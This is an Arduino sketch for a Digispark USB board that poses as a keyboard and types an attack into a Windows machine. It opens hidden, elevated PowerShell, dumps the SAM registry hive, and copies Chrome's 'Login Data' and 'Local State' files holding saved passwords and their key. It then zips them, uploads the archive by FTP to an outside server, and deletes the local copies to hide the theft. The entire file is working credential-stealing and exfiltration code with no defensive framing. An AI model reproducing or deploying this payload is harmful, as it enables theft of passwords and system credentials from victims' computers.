#include "DigiKeyboard.h"
void setup() {
    pinMode(1, OUTPUT);
}

  char mode[] = "powershell -nop -win h -noni -exec bypass";

void loop() {
      digitalWrite(1, HIGH); // Turn on the red LED
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(mode);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
	DigiKeyboard.delay(500);
  DigiKeyboard.print(" mkdir D:\\files");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(600);
  DigiKeyboard.print("reg save HKLM\\SAM d:\\files\\sam"); //copy sam or any other system files at different path
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(600);
	DigiKeyboard.print("cd $env:USERPROFILE"); //change to user profile directory on system
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(600);
	DigiKeyboard.print("cd AppData\\Local\\Google\\chrome\\'User Data'");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(600);
	DigiKeyboard.print("copy 'Local State' D:\\files\\"); //copying Local State file
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(600);
	DigiKeyboard.print("copy Default\\'Login Data' D:\\files\\"); //copying Login Data file
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(600);
	DigiKeyboard.print("cd D:\\");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(600);
	DigiKeyboard.print("Compress-Archive files files.zip");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(1500);
  DigiKeyboard.print("ftp {ip_address}"); //accessing ftp server
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("username"); // username of ftp
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("password"); //password of ftp
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("cd Desktop"); // ftp directory in which you want to copy the files 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("prompt"); 
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(600);
  DigiKeyboard.print("put files.zip");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("bye");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("del files");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("y"); 
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("del files.zip");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  digitalWrite(1, LOW); // Turn off the red LED
  while(1){}
}
